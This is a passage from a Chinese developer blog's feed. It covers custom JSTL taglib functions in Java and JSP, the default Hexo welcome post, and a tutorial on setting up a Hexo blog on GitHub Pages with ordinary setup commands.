class="line">      get element from elementes by random</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>randomElement<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>com.martinye.demo.util.taglib.FunctionsExt<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span>java.lang.String randomElement(java.lang.String[])<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">example</span>&gt;</span></span><br><span class="line">      <span class="symbol">&amp;lt;</span>c:if test=&quot;$&#123;fnExt:randomElement(elements)&#125;&quot;&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">example</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      Joins all elements of a collection into a string.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>join<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>com.martinye.demo.util.taglib.FunctionsExt<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span>java.lang.String join(java.lang.Object, java.lang.String)<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">example</span>&gt;</span></span><br><span class="line">      $&#123;fnExt:join(collection, &quot;;&quot;)&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">example</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="相关说明"><a href="#相关说明" class="headerlink" title="相关说明"></a>相关说明</h3><ol><li>函数式taglib prefix不允许包含特殊字符，标签类taglib可以包含部分特殊字符<br>实际操作过程中，遇到不允许包含字符：<code>-</code>。<br>例如：matinye-fn或者fn-ext这样的prefix都是不对的。</li></ol><p><strong>注</strong>：有待考证。</p><ol start="2"><li><p>short-name, uri都要唯一。</p></li><li><p>当前命令空间fnExt下所有的函数名都不允许重复，即便是重载函数。<br>例如：join(array)，join(array, String)不能都同时定义在taglib中。</p></li><li><p>不允许使用java.util.Collection类型作为参数，使用array或者Object代替。</p></li></ol><p><strong>注</strong>：有待考证。</p><h2 id="三、web-xml配置taglib"><a href="#三、web-xml配置taglib" class="headerlink" title="三、web.xml配置taglib"></a>三、web.xml配置taglib</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://demo.martinye.com/jsp/jstl/functions-ext<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/taglib/fn-ext.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、使用taglib"><a href="#四、使用taglib" class="headerlink" title="四、使用taglib"></a>四、使用taglib</h2><ol><li><p>jsp页面定义</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=&quot;http://demo.martinye.com/jsp/jstl/functions-ext&quot; prefix=&quot;fnExt&quot;%&gt;</span><br></pre></td></tr></table></figure></li><li><p>页面使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;fnExt:join(cdnServers, &quot; &quot;) &#125;<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://$&#123;fnExt:randomElement(cdnServerArr) &#125;/resources/img/logo.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><p><a href="http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter">Taglib in Java: tag with array parameter</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/javaee.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、扩展函数库&quot;&gt;&lt;a href=&quot;#一、扩展函数库&quot; class=&quot;headerlink&quot; title=&quot;一、扩展函数库&quot;&gt;&lt;/a&gt;一、扩展函数库&lt;/h2&gt;&lt;p&gt;在taglib函数类中添加需要的函数randomElement、join等。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; * &lt;span class=&quot;doctag&quot;&gt;@description&lt;/span&gt; JSTL function ext&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; * &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; * &lt;span class=&quot;doctag&quot;&gt;@author&lt;/span&gt; yeshaoting&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; * &lt;span class=&quot;doctag&quot;&gt;@date&lt;/span&gt; 2015-06-29 14:52:57&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;FunctionsExt&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Functions&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * &amp;lt;pre&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * jstl&amp;#x27;s fn:join only works with String[]. This one is more general.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * usage: $&amp;#123;nc:join(values, &amp;quot;, &amp;quot;)&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * &lt;span class=&quot;doctag&quot;&gt;@see&lt;/span&gt; http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * &amp;lt;/pre&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; String &lt;span class=&quot;title&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Object values, String seperator)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (values == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; StringUtils.EMPTY;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (values &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; Collection&amp;lt;?&amp;gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; StringUtils.join((Collection&amp;lt;?&amp;gt;) values, seperator);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (values &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; Object[])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; StringUtils.join((Object[]) values, seperator);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; values.toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * get element from elementes by random&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * &lt;span class=&quot;doctag&quot;&gt;@param&lt;/span&gt; elements&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   * &lt;span class=&quot;doctag&quot;&gt;@return&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; String &lt;span class=&quot;title&quot;&gt;randomElement&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] elements)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ArrayUtils.isEmpty(elements)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; StringUtils.EMPTY;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; index = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Random().nextInt(elements.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; CollectionUtils.get(elements, index).toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="taglib" scheme="http://yeshaoting.cn/tags/taglib/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yeshaoting.cn/article/hexo/hello-world/"/>
    <id>http://yeshaoting.cn/article/hexo/hello-world/</id>
    <published>2015-12-29T06:06:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/hexo.png" title="hexo" class="img-logo img-center" /><p>Welcome to <a href="http://hexo.io/">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="http://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="http://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="http://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="http://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/hexo.png&quot; title=&quot;hexo&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;Welcome to &lt;a href=&quot;http://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! Thi</summary>
      
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>hexo搭建github博客</title>
    <link href="http://yeshaoting.cn/article/hexo/hexo%E6%90%AD%E5%BB%BAgithub%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yeshaoting.cn/article/hexo/hexo%E6%90%AD%E5%BB%BAgithub%E5%8D%9A%E5%AE%A2/</id>
    <published>2015-12-29T06:04:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/blog.png" title="hexo" class="img-logo img-center" /><h2 id="一、创建Github-Pages"><a href="#一、创建Github-Pages" class="headerlink" title="一、创建Github Pages"></a>一、创建Github Pages</h2><p>Github Pages为我们提供静态页面的托管。<br>参见：<a href="http://www.pchou.info/web-build/2013/01/05/build-github-blog-page-02.html">一步步在GitHub上创建博客主页(2)</a></p><h3 id="1-注册github账号"><a href="#1-注册github账号" class="headerlink" title="1. 注册github账号"></a>1. 注册github账号</h3><p>登录github.com，创建用户账号：yeshaoting。<br>访问地址：<a href="https://github.com/yeshaoting">https://github.com/yeshaoting</a></p><h3 id="2-配置和使用github"><a href="#2-配置和使用github" class="headerlink" title="2. 配置和使用github"></a>2. 配置和使用github</h3><p>参见：<a href="http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/">如何搭建一个独立博客——简明 Github Pages与 jekyll 教程</a></p><h4 id="生成新的SSH-Key"><a href="#生成新的SSH-Key" class="headerlink" title="生成新的SSH Key"></a>生成新的SSH Key</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;yeshaoting@163.com&quot;</span><br></pre></td></tr></table></figure><p>在~/.ssh目录会生成秘钥id_rsa，公钥id_rsa.pub</p><h4 id="添加SSH-key到github"><a href="#添加SSH-key到github" class="headerlink" title="添加SSH key到github"></a>添加SSH key到github</h4><ol><li>查看并复制公钥id_rsa.pub内容。</li><li>登录github，在Accout Settings -&gt; SSH Public Keys -&gt; add another public keys</li><li>将复制id_rsa.pub内容复制到密钥文本框中。</li></ol><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="3-创建项目仓库"><a href="#3-创建项目仓库" class="headerlink" title="3. 创建项目仓库"></a>3. 创建项目仓库</h3><p>想建立个人博客，需要在github上建立yeshaoting.github.io的repository。<br>其中，repository名必须是 <strong>github账号名</strong>.github.io，我的github账号是yeshaoting，所以若想创建一个github pages博客，repository必须是yeshaoting.github.io；否则，创建不成功。</p><p>创建过程如下图所示：<br><img src="http://cnfeat.qiniudn.com/13.png" alt="github上建立仓库"></p><h2 id="二、安装hexo"><a href="#二、安装hexo" class="headerlink" title="二、安装hexo"></a>二、安装hexo</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p>官方中文网址：<a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p><p>参见：<a href="http://cnfeat.com/blog/2014/05/10/how-to-build-a-blog/">如何搭建一个独立博客——简明 Github Pages与 jekyll 教程</a></p><h3 id="1-安装node-js"><a href="#1-安装node-js" class="headerlink" title="1. 安装node js"></a>1. 安装node js</h3><p>登录：<a href="https://nodejs.org/%EF%BC%8C%E5%B9%B6%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E3%80%82">https://nodejs.org/，并下载安装包。</a><br>安装或解压node js到对应的目录 NODEJS_HOME。<br>将 $NODEJS_HOME/bin 目录添加到系统环境变量PATH里。</p><h3 id="2-安装hexo"><a href="#2-安装hexo" class="headerlink" title="2. 安装hexo"></a>2. 安装hexo</h3><p>Hexo的作者是tommy351，根据官方介绍，Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h2 id="三、建站"><a href="#三、建站" class="headerlink" title="三、建站"></a>三、建站</h2><p>创建hexo目录：hexo-blog</p><h2 id="初始化并安装hexo"><a href="#初始化并安装hexo" class="headerlink" title="初始化并安装hexo"></a>初始化并安装hexo</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd hexo-blog</span><br><span class="line">hexo init &amp;&amp; npm install</span><br></pre></td></tr></table></figure><p>重新安装，可以尝试使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> hexo-blog</span><br><span class="line">npm install hexo --save</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── scripts</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p>目录结构说明如下：<br><strong>_config.yml</strong><br>网站的 配置 信息，您可以在此配置大部分的参数。</p><p><strong>package.json</strong><br>应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。</p><p><strong>scaffolds</strong><br>模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p><strong>scripts</strong><br>脚本 文件夹。脚本是扩展 Hexo 最简易的方式，在此文件夹内的 JavaScript 文件会被自动执行。</p><p><strong>source</strong><br>资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p><p><strong>themes</strong><br>主题 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="修改网站信息"><a href="#修改网站信息" class="headerlink" title="修改网站信息"></a>修改网站信息</h2><p>打开_config.yml，修改网站信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: 芳草地</span><br><span class="line">subtitle: 叶绍亭</span><br><span class="line">description:</span><br><span class="line">author: yeshaoting</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: Asia/Shanghai</span><br></pre></td></tr></table></figure><h2 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h2><p>官方收纳的主题：<a href="http://hexo.io/themes/">http://hexo.io/themes/</a><br>我选用 jacman 主题。<br>点击进入<a href="http://wuchong.me/jacman/%E4%BB%8B%E7%BB%8D%E9%A1%B5%E6%9C%89%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97%EF%BC%9A[%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8">http://wuchong.me/jacman/介绍页有相关的安装指南：[如何使用</a> Jacman 主题](<a href="http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)%E3%80%82">http://wuchong.me/jacman/2014/11/20/how-to-use-jacman/)。</a></p><p><strong>注</strong>：下载完主题后，需要修改_config.yml文件，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theme: jacman</span><br><span class="line">stylus:</span><br><span class="line">  compress: true</span><br></pre></td></tr></table></figure><h2 id="四、服务部署"><a href="#四、服务部署" class="headerlink" title="四、服务部署"></a>四、服务部署</h2><p>参见：<a href="https://hexo.io/zh-cn/docs/">hexo官方网站</a><br>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p><h3 id="安装-hexo-deployer-git"><a href="#安装-hexo-deployer-git" class="headerlink" title="安装 hexo-deployer-git"></a>安装 hexo-deployer-git</h3><p><code>npm install hexo-deployer-git --save</code></p><h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Deployment</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Docs: http://hexo.io/docs/deployment.html</span></span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: 